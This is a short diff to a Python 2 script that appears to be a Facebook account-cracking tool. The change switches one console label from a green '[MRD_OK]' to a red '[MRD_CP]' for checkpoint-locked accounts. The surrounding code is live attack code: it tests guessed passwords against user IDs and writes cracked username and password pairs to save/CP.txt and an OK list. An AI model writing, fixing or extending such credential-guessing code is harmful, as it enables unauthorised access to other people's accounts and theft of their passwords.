@@ -178,7 +178,7 @@ def action():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m  [MRD_OK] ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass1
                 cps = open('save/CP.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -194,7 +194,7 @@ def action():
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;92m  [MRD_OK] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass2
                     cps = open('save/CP.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
